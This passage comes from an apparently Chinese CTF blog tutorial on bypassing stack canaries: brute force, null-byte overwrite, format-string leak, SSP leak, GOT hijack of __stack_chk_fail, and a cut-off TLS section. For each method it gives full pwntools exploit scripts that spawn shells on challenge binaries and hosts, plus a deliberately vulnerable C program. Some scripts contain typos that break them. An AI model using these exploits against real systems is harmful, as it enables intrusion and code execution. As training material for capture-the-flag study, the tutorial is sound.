class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()将给定的整数转换为单字节的字节串</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1对齐栈</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="二、覆盖截断字符（-x00）获取canary"><a href="#二、覆盖截断字符（-x00）获取canary" class="headerlink" title="二、覆盖截断字符（\x00）获取canary"></a>二、覆盖截断字符（\x00）获取canary</h4><p>思路：<br>$构造第一次溢出，覆盖canary的低字节\x00，读出canary的值.<br>$构造第二次溢出，利用获取的canary构造payload，get shell.<br>【babypie】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p><p>  两次read溢出</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p><p>NX打开有可利用的system（”&#x2F;bin&#x2F;sh”）<br>PIE打开后低地址始终不变，可以碰运气（buhsi(●’◡’●)）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p><p>canary以\x00结尾（为防止被读出）那我们就溢出覆盖\x00再通过print函数打印出canary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p><p>0x30-0x8 &#x3D; 40，再+1覆盖\x00<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh = process(&#x27;./babypie&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29536</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先整canary</span></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Input your Name:\n&#x27;</span>,payload)</span><br><span class="line">sh.recv(<span class="number">6</span> + <span class="number">40</span>)<span class="comment">#读取6个字节（即程序的回应消息）和40个字节（即程序返回的canary值）</span></span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>)) &amp; (<span class="number">0xffffffffffffff00</span>)<span class="comment">#末尾清0以保持与程序内部的字节对齐</span></span><br><span class="line">log.success(<span class="string">&#x27;canary:%x \n&#x27;</span>,canary)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(canary)  + p64(<span class="number">0</span>)+ <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment">#p64(0)将栈上的返回地址替换为0，从而绕过内存保护机制</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="三、利用格式化字符串获取canary"><a href="#三、利用格式化字符串获取canary" class="headerlink" title="三、利用格式化字符串获取canary"></a><strong>三、利用格式化字符串获取canary</strong></h4><p>格式化字符串可以打印出栈中内容，目标利用此漏洞打印出canary值，再利用溢出进行攻击.<br>【Mary_Morton】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p><p>快乐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p><p> 计算偏移喽<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p><p>buf与canary距离 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17个内存单元<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p><p>canary与printf格式化字符串形参相对偏移为17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p=process(&#x27;./mary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">63174</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;battle \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">tmp=<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">canary=p64(tmp)</span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x88</span>)+canary+p64(<span class="number">0</span>)+p64(<span class="number">0x4008DA</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;3.&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="四、SSP-Leak利用canary"><a href="#四、SSP-Leak利用canary" class="headerlink" title="四、SSP Leak利用canary"></a><strong>四、SSP Leak利用canary</strong></h4><p>思路：<br>$canary检测失败会触发stack_chk_fali函数造成stack smashing（stack smashing protect leak）<br>$stack_chk_fail函数会输出一段报错显示文件名，覆盖文件名指针，从而实现任意读也就是覆盖变量__libc_argv[0]<br>$利用相应函数进行溢出（puts、read、write）得到libcbase 得出关键地址进行攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminatedn&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖到argv就可输出我们想要的参数（即利用了canary的报错信息）</p><p>不同的libc对于__fortify_fail实现有差异，下面是glibc的实现<br><a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">github源码：glibc&#x2F;debug&#x2F;fortify_fail.c</a><br>【2018网鼎杯 Guess】<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p><p>(2)IDA分析<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p><p>（3）利用stack samshing原理 gdb调试找到argv[0]计算偏移<br>通过覆盖libc_argv[0]的内容触发canary保护将覆盖内容进行输出<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p><p>在main函数位置下断点 rsi处为argv[0]地址(0x7fffffffdfc87)<br>libc中有一个变量environ，储存着栈地址 只要得到libc基址，就可以算出这个变量的地址，再次用__stack_chk_fail读取这个变量就可以得到栈的一个地址，就能计算出读进来的flag的地址，从而再次用stack smash读取flag</p><p>第一次，我们泄露函数的got表内容，得到glibc地址。得到glibc地址，是为了计算出stack_end变量的地址，进而，第二次，我们泄露栈地址，计算出flag存放的地址，于是，第三次，我们就可以泄露flag的值。</p><p>gets函数下断点  调试计算偏移0xfc8-0xea0（0x128）【还需进一步深入理解】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27922</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: leak puts_addr</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">puts_plt = leak_addr(payload1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt-----&gt;&quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_plt)</span><br><span class="line">libc_base = puts_plt - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base-----&gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc.dump(<span class="string">&#x27;__environ&#x27;</span>) + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: leak environ</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">environ_addr = leak_addr(payload2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enviorn in stack-----&gt;&quot;</span> + <span class="built_in">hex</span>(environ_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak flag</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ_addr-<span class="number">0x168</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>,payload3)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="五、劫持stack-chk-fail函数泄露canary"><a href="#五、劫持stack-chk-fail函数泄露canary" class="headerlink" title="五、劫持stack_chk_fail函数泄露canary"></a>五、劫持stack_chk_fail函数泄露canary</h4><p>思路：劫持stack_chk_fail，可以修改全局偏移表(GOT)中存储的_stack_chk_fail函数地址，在触发canary检查失败时，跳转到指定的地址继续执行.</p><p>百度杯flagen其实可以做更好的栗子 目前暂未获取到相关文件 以后有机会填坑😊</p><p>有相关文章[(12条消息) [pwn]ROP：三道题讲解花式绕过Canary栈保护_breezeO_o的博客-CSDN博客](<a href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=百度杯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p><p>自己整个小简单🤖<br><strong>漏洞代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">175</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">275</span>);#栈溢出</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想成功劫持函数修改got表 需关闭relro<br>调用shell函数需要关闭pie</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="selector-tag">a</span><span class="selector-class">.c</span> -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">offset=<span class="number">10</span></span><br><span class="line">scf_got=ELF(<span class="string">&#x27;a&#x27;</span>).got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">gs_addr=ELF(<span class="string">&#x27;a&#x27;</span>).sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)</span><br><span class="line">sh.send(exp+<span class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>乐乐乐<br>找到文件了<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>【flagen】<br>got表覆写原理<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p><p>此部分会将输入部分变长（1个字节变成3个字节），其中dest为指向堆缓冲区的指针，在调用leetify()时，其值将被压入栈中，由于该函数存在栈溢出漏洞，攻击者可以利用这个漏洞覆盖掉dest的值为指定地址，在后续调用strcpy()时，实现向任意地址写的目的。<br>我们可以将dest覆盖为stack_chk_fail函数在got表中的地址，达到修改stack_chk_fail函数调用地址的目的，这样后续在调用该函数时，实际上执行的是攻击者的代码。又因为canary存在\x00截断，需寻找合适的函数进行输入.</p><p>还是通过泄露libcbase getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">p,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addprefix</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prin</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">puts=<span class="number">0x08048510</span></span><br><span class="line">ret=<span class="number">0x0804846a</span></span><br><span class="line">stack_check=<span class="number">0x0804B01C</span></span><br><span class="line">pop_1=<span class="number">0x08048481</span></span><br><span class="line">pop_2=<span class="number">0x08048b00</span></span><br><span class="line">pop_3=<span class="number">0x08048d8d</span></span><br><span class="line">bss=<span class="number">0x804b144</span>+<span class="number">0x8</span></span><br><span class="line">a=<span class="number">0x08048F60</span></span><br><span class="line">read=<span class="number">0x080486CB</span></span><br><span class="line">p=process(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line">payload=p32(ret)+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x55</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p32(pop_1)+p32(stack_check)</span><br><span class="line">payload+=p32(puts)+p32(pop_1)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(bss+<span class="number">0x100</span>)+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;free&#x27;</span>])+p32(pop_1)+p32(bss+<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">input</span>(p,payload)</span><br><span class="line">change(p)</span><br><span class="line">alarm=u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="六、修改TSL绕过canary"><a href="#六、修改TSL绕过canary" class="headerlink" title="六、修改TSL绕过canary"></a>六、修改TSL绕过canary</h4><p>在linux下有一种线程局部存储（Tread Local Storage）机制，即TLS.<br>存储线程的一些全局变量.<br>结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span 